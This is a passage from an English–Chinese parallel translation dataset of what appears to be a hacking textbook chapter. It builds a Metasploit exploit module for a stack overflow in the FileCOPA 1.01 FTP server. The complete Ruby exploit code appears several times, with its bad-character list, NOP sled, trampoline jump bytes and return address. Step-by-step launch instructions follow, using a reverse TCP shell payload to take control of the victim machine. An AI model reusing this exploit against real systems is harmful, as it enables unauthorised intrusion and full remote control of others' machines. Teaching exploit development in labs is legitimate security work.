    code for "do nothing." Another example is to increment a register, then decrement
    the same register, resulting in an unchanged state.
  id: totrans-87
  prefs: []
  type: TYPE_NORMAL
  zh: 你将知道哪些字符没有幸存，因为流是顺序的，如果发生任何事情，将会有一个字符不在其位。这个过程会重复进行，因为流一次只会揭示一个坏字符。你必须重复这个过程，直到你的流完整到达。一旦发生这种情况，你将找到所有的坏字符。这项耗时的工作将确保编码后的有效载荷正确到达。坏字符在创建NOP滑梯（不会滑动到我们的shellcode的操作）以及编码有效载荷时都很重要。一个*NOP滑梯*是执行时不会执行任何操作的代码段。一个简单的“无操作”命令是`0x90`，这是计算机操作码，表示“不执行任何操作”。另一个例子是增加一个寄存器，然后减少相同的寄存器，结果状态不变。
- en: '![Tracking down bad characters](../Images/00021.jpg)'
  id: totrans-88
  prefs: []
  type: TYPE_IMG
  zh: '![追踪坏字符](../Images/00021.jpg)'
- en: Figure 10-5. Tracking down bad characters
  id: totrans-89
  prefs: []
  type: TYPE_NORMAL
  zh: 图10-5. 追踪坏字符
- en: 'You can see from [Figure 10-5](#filepos827317) that `\x0a` and `\x0d` are not
    included. The bad characters I found in this exploit are:'
  id: totrans-90
  prefs: []
  type: TYPE_NORMAL
  zh: 您可以从[图10-5](#filepos827317)中看到`\x0a`和`\x0d`没有被包含。我在这个漏洞利用中发现的坏字符有：
- en: '`\x00\x0b\x0a\x0d\x20\x23\x25\x26\x2b\x2f\x3a\x3f\x5c`'
  id: totrans-91
  prefs: []
  type: TYPE_NORMAL
  zh: '`\x00\x0b\x0a\x0d\x20\x23\x25\x26\x2b\x2f\x3a\x3f\x5c`'
- en: 'These are added to the module and assigned to `BadChars`. Now, we shift our
    attention to the `exploit` method and finish the module. Using a fuzzer such as
    SPIKE (an open source fuzzing framework written by Dave Aitel), you will find
    the vulnerability and the type of string used to crash the FTP server. The length
    of the string is important because it will reveal how much space we have to put
    in our payload. We can also look at the advisory for the proof of concept used
    to crash the application. The string will look similar to this:'
  id: totrans-92
  prefs: []
  type: TYPE_NORMAL
  zh: 这些被添加到模块中并分配给`BadChars`。现在，我们将注意力转向`exploit`方法并完成模块。使用SPIKE（由Dave Aitel编写的开源模糊测试框架）这样的fuzzer，你可以找到漏洞以及用于使FTP服务器崩溃的字符串类型。字符串的长度很重要，因为它将揭示我们在有效载荷中可以放置多少空间。我们还可以查看用于使应用程序崩溃的概念验证的公告。字符串将类似于以下内容：
- en: '`LIST A BBBBBBBBBBBBBBBBBBBBBB...x 350...BBBBBBBBBB`'
  id: totrans-93
  prefs: []
  type: TYPE_NORMAL
  zh: '`LIST A BBBBBBBBBBBBBBBBBBBBBB...x 350...BBBBBBBBBB`'
- en: 'Since there isn''t enough space to insert our shellcode before the jump address,
    we need to modify our `buf` contents. The new attack string will look like this:'
  id: totrans-94
  prefs: []
  type: TYPE_NORMAL
  zh: 由于在跳转地址之前没有足够的空间插入我们的shellcode，我们需要修改我们的`buf`内容。新的攻击字符串将看起来像这样：
- en: '`buf  = "A\x20" + rand_text_english(160, payload_badchars) buf << [target.ret].pack(''V'')
    buf << make_nops(4) + jmp_ecx buf << make_nops(444) + payload.encoded + "\r\n"`'
  id: totrans-95
  prefs: []
  type: TYPE_NORMAL
  zh: '`buf  = "A\x20" + rand_text_english(160, payload_badchars) buf << [target.ret].pack(''V'')
    buf << make_nops(4) + jmp_ecx buf << make_nops(444) + payload.encoded + "\r\n"`'
- en: Breaking down each line, the `A\x20` represents the letter *A* followed by one
    space (`\x20` is the hexadecimal representation of a space). Then 160 bytes of
    random characters are appended as padding. This number came from the offset found
    by *pattern_offset.rb*. The method `payload_badchars` ensures that none of the
    bad characters will end up in the random data. The return address is then added
    to the payload and converted to a usable address by the `pack` method. The `V`
    argument converts the return address to a specific binary sequence known as *little-endian*
    byte order.
  id: totrans-96
  prefs: []
  type: TYPE_NORMAL
  zh: 分解每一行，`A\x20`代表字母*A*后跟一个空格（`\x20`是空格的十六进制表示）。然后附加160个随机字符作为填充。这个数字来自由*pattern_offset.rb*找到的偏移量。`payload_badchars`方法确保随机数据中不会出现任何坏字符。然后返回地址被添加到有效载荷中，并通过`pack`方法转换为可用的地址。`V`参数将返回地址转换为称为*小端字节序*的特定二进制序列。
- en: 'After the return address, we add four NOPs to `buf`. The NOPs don''t do anything
    other than fill the space. The difference between the `payload_badchars` and `make_nops`
    method is this: if `make_nops` is executed, it won''t affect the exploit execution.'
  id: totrans-97
  prefs: []
  type: TYPE_NORMAL
  zh: 在返回地址之后，我们在`buf`中添加四个NOP。NOPs除了填充空间外不做任何事情。`payload_badchars`和`make_nops`方法的区别在于：如果执行`make_nops`，它不会影响漏洞利用的执行。
- en: The next piece of the malicious string, `buf`, is tricky. Since there wasn't
    enough space before the return address to place a full-sized payload, we use a
    trick to jump to the payload. This is called a *shared library trampoline*. The
    basic idea is that instead of getting the instruction pointer to point to the
    payload address directly, we will look for our payload address in the registers
    and load the register's contents into the instruction pointer. All we need to
    ensure success is for the register to have an address pointing somewhere between
    the NOP sled and the start of our payload.
  id: totrans-98
  prefs: []
  type: TYPE_NORMAL
  zh: 恶意字符串的下一部分，`buf`，很棘手。由于在返回地址之前没有足够的空间放置完整大小的有效载荷，我们使用一个技巧来跳转到有效载荷。这被称为*共享库跳跃垫*。基本思想是，我们不会直接将指令指针指向有效载荷地址，而是将在寄存器中查找我们的有效载荷地址并将寄存器的内容加载到指令指针中。我们只需要确保寄存器有一个指向NOP
    sled和我们的有效载荷开始的地址之间的地址。
- en: In this case, the address located in the ECX register will be pushed on the
    stack and then the `return` method will be called. The `return` function causes
    the payload address on the stack to be loaded into the instruction pointer and
    will result in our payload being executed. The transition from the FTP server
    execution to our payload is when we officially get control of the process. The
    exploit won't work unless this transition is perfect.
  id: totrans-99
  prefs: []
  type: TYPE_NORMAL
  zh: 在这种情况下，位于ECX寄存器中的地址将被压入堆栈，然后调用`return`方法。`return`函数将堆栈上的有效载荷地址加载到指令指针中，并将导致我们的有效载荷被执行。从FTP服务器执行到我们的有效载荷的转换是我们正式控制进程的时候。除非这个转换是完美的，否则漏洞利用将不会工作。
- en: The last two pieces of our evil `LIST` argument are a sizeable NOP sled (444
    characters in length) and the encoded payload. The whole string is terminated
    by a carriage return and newline feed which let the FTP server know we are done
    sending data. `buf` contains a very large string, but as you can see in the example
    code, it's broken up on each line.
  id: totrans-100
  prefs: []
  type: TYPE_NORMAL
  zh: 我们邪恶的`LIST`论证的最后两部分是一个相当大的NOP滑梯（长度为444个字符）和编码后的有效载荷。整个字符串以回车和换行符结束，这会让FTP服务器知道我们已经完成了数据的发送。`buf`包含一个非常长的字符串，但正如示例代码所示，它在每一行都被分割开来。
- en: 'To complete the exploit, our module sends the command `LIST` with our malicious
    string contained in `buf`. The results are a rooted Windows 2000 Service Pack
    4 machine. If you have never used MSF, then the `reverse_shell` connection is
    a good payload with which to start. The payload tells the victim machine to send
    a command prompt to your address. The `handler` catches the session and allows
    you to have complete control over the machine. The other nice feature about a
    reverse connection is that, since the connection originates from within the victim''s
    network, it easily bypasses a firewall. Now your module should look like this:'
  id: totrans-101
  prefs: []
  type: TYPE_NORMAL
  zh: 为了完成漏洞利用，我们的模块通过`buf`发送包含恶意字符串的`LIST`命令。结果是获得了一个Windows 2000 Service Pack 4的root权限机器。如果你从未使用过MSF，那么`reverse_shell`连接是一个很好的起始有效载荷。有效载荷会指示受害机器将命令提示符发送到你的地址。`handler`捕获会话，让你能够完全控制该机器。反向连接的另一个优点是，由于连接是从受害者的网络内部发起的，它很容易绕过防火墙。现在你的模块应该看起来像这样：
- en: '`require ''msf/core''  module Msf    class Exploits::Windows::Ftp::FileCopa_List
    < Msf::Exploit::Remote      include Exploit::Remote::Ftp      def initialize(info
    = {})       super(update_info(info,              ''Name''           => ''FileCOPA
    1.01 <= List Overflow'',           ''Description''    => %q{This module exploits
    a stack overflow in the FileCOPA multi-protocol file transfer service. A valid
    user account (or anonymous access) is required for this exploit to work.      
         },           ''Author''         => ''Steve <Steve@nostarch.com>'',       
       ''License''        => MSF_LICENSE,           ''Version''        => ''$Revision:
    4498 $'',           ''References''   =>             [             [''OSVDB'',
    ''27389''],           ],           ''Privileged''     => true,           ''DefaultOptions''
    =>             {             ''EXITFUNC'' => ''thread'',           },         
     ''Payload''        =>             {             ''Space''    => 1000,       
         ''BadChars'' => "\x00",           },           ''Targets''        =>     
           [             [               ''Windows 2000 Professional SP4 English'',
                  {                 ''Platform'' => ''win'',                 ''Ret''
         => 0XDEADBEEF,               },             ],           ]))     end    
     def exploit       connect_login        print_status("Trying target #{target.name}...")    
       jmp_ecx = "\x66\x81\xc1\xa0\x01\x51\xc3"        buf  = "A\x20" + rand_text_english(160,
    payload_badchars)       buf << [target.ret].pack(''V'')       buf << make_nops(4)
    + jmp_ecx buf << make_nops(444) + payload.encoded + "\r\n"        send_cmd( [''LIST'',
    buf] , false)        handler       disconnect     end   endend`'
  id: totrans-102
  prefs: []
  type: TYPE_NORMAL
  zh: '`require ''msf/core''  module Msf      class Exploits::Windows::Ftp::FileCopa_List
    < Msf::Exploit::Remote      include Exploit::Remote::Ftp      def initialize(info
    = {})      super(update_info(info,      ''Name''         => ''FileCOPA 1.01 <=
    列表溢出'',      ''Description''  => %q{此模块利用了FileCOPA多协议文件传输服务中的堆栈溢出。此漏洞利用需要有效的用户账户（或匿名访问）才能工作。    
     },      ''Author''         => ''Steve <Steve@nostarch.com>'',      ''License''
           => MSF_LICENSE,      ''Version''        => ''$Revision: 4498 $'',      ''References''  =>    
             [              [''OSVDB'', ''27389''],              ],      ''Privileged''
        => true,      ''DefaultOptions'' =>              {              ''EXITFUNC''
    => ''thread'',              },      ''Payload''        =>              {      
           ''Space'' => 1000,              ''BadChars'' => "\x00",              },    
     ''Targets''        =>              [              [                      ''Windows
    2000 Professional SP4 英文版'',                      {                          
       ''Platform'' => ''win'',                              ''Ret'' => 0XDEADBEEF,    
                             },                      ],              ]))      end    
     def exploit      connect_login      print_status("尝试目标 #{target.name}...")    
     jmp_ecx = "\x66\x81\xc1\xa0\x01\x51\xc3"      buf = "A\x20" + rand_text_english(160,
    payload_badchars)      buf << [target.ret].pack(''V'')      buf << make_nops(4)
    + jmp_ecx      buf << make_nops(444) + payload.encoded + "\r\n"      send_cmd(
    [''LIST'', buf] , false)      handler      disconnect      end      endend`'
- en: 'There are some features of MSF that can help polish up the exploit process
    a bit. We are going to add another method called `check` to the module in between
    `initialize` and `exploit`. This method will determine whether a target is vulnerable
    to this exploit by analyzing the banner. To do this, we''d have to know what the
    banner of a vulnerable system looks like. A word of caution: If the system administrator
    changed the banner, then this check won''t work. Since most banners are left intact,
    this generally streamlines the target validation process.'
  id: totrans-103
  prefs: []
  type: TYPE_NORMAL
  zh: MSF有一些特性可以帮助稍微提升利用过程。我们将在`initialize`和`exploit`之间添加一个名为`check`的新方法到模块中。这个方法将通过分析banner来确定目标是否容易受到这种利用的攻击。为此，我们需要知道一个易受攻击系统的banner看起来是什么样子的。提醒一下：如果系统管理员更改了banner，那么这个检查将不会起作用。由于大多数banner都保持不变，这通常简化了目标验证过程。
- en: 'The module will connect to port 21 on the target machine, grab the banner,
    and then disconnect. If the banner contains *FileCOPA FTP Server Version 1.01*,
    we know the target is vulnerable. If the banner check fails, then we may want
    to look for another attack vector, or we can try the exploit anyway. The code
    for the check method is shown below:'
  id: totrans-104
  prefs: []
  type: TYPE_NORMAL
  zh: 该模块将连接到目标机器的21端口，获取banner，然后断开连接。如果banner包含*FileCOPA FTP Server Version 1.01*，我们知道目标容易受到攻击。如果banner检查失败，那么我们可能需要寻找另一个攻击向量，或者我们仍然可以尝试利用。下面是检查方法的代码：
- en: '`def check     connect     disconnect     if (banner =~ /FileCOPA FTP Server
    Version 1\.01/)         return Exploit::CheckCode::Vulnerable     end     return
    Exploit::CheckCode::Safe end`'
  id: totrans-105
  prefs: []
  type: TYPE_NORMAL
  zh: '`def check connect disconnect if (banner =~ /FileCOPA FTP Server Version 1.01/)
    return Exploit::CheckCode::Vulnerable end return Exploit::CheckCode::Safe end`'
- en: 'Now putting all of the MSF module code together, you get a fully functioning
    exploit:'
  id: totrans-106
  prefs: []
  type: TYPE_NORMAL
  zh: 现在将所有MSF模块代码放在一起，你得到一个完全功能的利用：
- en: '`require ''msf/core''  module Msf    class Exploits::Windows::Ftp::FileCopa_List
    < Msf::Exploit::Remote      include Exploit::Remote::Ftp      def initialize(info
    = {})       super(update_info(info,           ''Name''           => ''FileCOPA
    1.01 <= List Overflow'',           ''Description''    => %q{This module exploits
    a stack overflow in the FileCOPA multi-protocol file transfer service. A valid
    user account (or anonymous access) is required for this exploit to work.     
         },           ''Author''         => ''Steve <Steve@nostarch.com>'',       
       ''License''        => MSF_LICENSE,           ''Version''        => ''$Revision:
    4498 $'',           ''References''   =>             [             [''OSVDB'',
    ''27389''],           ],           ''Privileged''     => true,           ''DefaultOptions''
    =>             {             ''EXITFUNC'' => ''thread'',           },         
     ''Payload''        =>             {             ''Space''    => 400,         
       ''BadChars'' => "\x00\x0b\x0a\x0d\x20\x23\x25\x26\x2b\x2f\x3a\x3f\x5c",   
             ''SaveRegisters'' => [''ecx''],           },           ''Targets''  
         =>             [             [               ''Windows 2000 Professional
    SP4 English'',               {                 ''Platform'' => ''win'',       
             ''Ret''      => 0x77E14C29,               },             ],         
     ]))     end      def check       connect       disconnect       if (banner =~
    /FileCOPA FTP Server Version 1\.01/)         return Exploit::CheckCode::Vulnerable
          end       return Exploit::CheckCode::Safe     end      def exploit     
     connect_login        print_status("Trying target #{target.name}...")        jmp_ecx
    = "\x66\x81\xc1\xa0\x01\x51\xc3"        buf  = "A\x20" + rand_text_english(160,
    payload_badchars)       buf << [target.ret].pack(''V'')       buf << make_nops(4)
    + jmp_ecx buf << make_nops(444) + payload.encoded + "\r\n"        send_cmd( [''LIST'',
    buf] , false)        handler       disconnect     end   end end`'
  id: totrans-107
  prefs: []
  type: TYPE_NORMAL
  zh: '`require ''msf/core''  module Msf   class Exploits::Windows::Ftp::FileCopa_List
    < Msf::Exploit::Remote   include Exploit::Remote::Ftp   def initialize(info =
    {})   super(update_info(info,   ''Name'' => ''FileCOPA 1.01 <= List Overflow'',   ''Description''
    => %q{This module exploits a stack overflow in the FileCOPA multi-protocol file
    transfer service. A valid user account (or anonymous access) is required for this
    exploit to work.   },   ''Author'' => ''Steve <Steve@nostarch.com>'',   ''License''
    => MSF_LICENSE,   ''Version'' => ''$Revision: 4498 $'',   ''References'' => [   [''OSVDB'',
    ''27389''],   ],   ''Privileged'' => true,   ''DefaultOptions'' => {   ''EXITFUNC''
    => ''thread'',   },   ''Payload'' => {   ''Space'' => 400,   ''BadChars'' => "\x00\x0b\x0a\x0d\x20\x23\x25\x26\x2b\x2f\x3a\x3f\x5c",   ''SaveRegisters''
    => [''ecx''],   },   ''Targets'' => [   [   ''Windows 2000 Professional SP4 English'',   {   ''Platform''
    => ''win'',   ''Ret'' => 0x77E14C29,   },   ],   ]))   end   def check   connect   disconnect   if
    (banner =~ /FileCOPA FTP Server Version 1\.01/)   return Exploit::CheckCode::Vulnerable   end   return
    Exploit::CheckCode::Safe   end   def exploit   connect_login   print_status("Trying
    target #{target.name}...")   jmp_ecx = "\x66\x81\xc1\xa0\x01\x51\xc3"   buf  =
    "A\x20" + rand_text_english(160, payload_badchars)   buf << [target.ret].pack(''V'')   buf
    << make_nops(4) + jmp_ecx   buf << make_nops(444) + payload.encoded + "\r\n"   send_cmd(
    [''LIST'', buf] , false)   handler   disconnect   end   end end`'
- en: 'That completes the exploit. All that is left to do is test it out. So restart
    the FTP server on the victim machine, and reload the `FileCOPA` module on your
    attack machine. A quick rundown of the steps is listed below:'
  id: totrans-108
  prefs: []
  type: TYPE_NORMAL
  zh: 这就完成了利用。接下来要做的就是测试它。因此，在受害者机器上重新启动FTP服务器，并在您的攻击机器上重新加载`FileCOPA`模块。以下是步骤的简要概述：
- en: Search for *FileCOPA* in the MSF GUI.
  id: totrans-109
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 在MSF GUI中搜索*FileCOPA*。
- en: Double-click the **FileCOPA LIST Exploit**.
  id: totrans-110
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 双击**FileCOPA LIST Exploit**。
- en: A new window will pop up.
  id: totrans-111
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 将弹出一个新窗口。
- en: 'Choose the correct target from the drop-down menu: **Windows 2k Server SP4
    English**.'
  id: totrans-112
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 从下拉菜单中选择正确的目标：**Windows 2k Server SP4 English**。
- en: 'Choose a payload: **generic/shell_reverse_tcp**.'
  id: totrans-113
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 选择一个有效载荷：**generic/shell_reverse_tcp**。
- en: You'll need to add `RHOST`, which is the remote host, and `LHOST`, the local
    host.
  id: totrans-114
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 你需要添加`RHOST`，即远程主机，以及`LHOST`，本地主机。
- en: Click **Apply**—this will launch the exploit.
  id: totrans-115
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 点击**应用**—这将启动利用。
- en: The window will close, and a new job will be displayed in the Jobs pane.
  id: totrans-116
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 窗口将关闭，并在作业面板中显示一个新作业。
- en: If the exploit was successful, you will have a new session in the Session pane.
  id: totrans-117
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 如果利用成功，你将在会话面板中看到一个新会话。
- en: To see what happened after you hit Apply, click the **Module Output** tab in
    the lower-left pane.
  id: totrans-118
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 要查看应用后的结果，请点击左下角的**模块输出**标签。
- en: Now you have a shell, and we get to the "managing phase" mentioned at the beginning
    of the chapter. This example went pretty quickly, and I've always found exploiting
    systems on my own more time consuming than when following along with an example.
    If you decide to try these techniques on your own, remember to have patience.
    This is a game of perpetual learning, so don't forget to enjoy the journey. Happy
    hacking! ;-)
  id: totrans-119
  prefs: []
  type: TYPE_NORMAL
  zh: 现在你已经拥有了一个shell，我们来到了本章开头提到的“管理阶段”。这个例子进行得相当迅速，我总是觉得自己在没有跟随示例的情况下利用系统更耗时。如果你决定自己尝试这些技巧，请记住要有耐心。这是一场永无止境的学习游戏，所以不要忘记享受这个过程。祝你好运！;-)
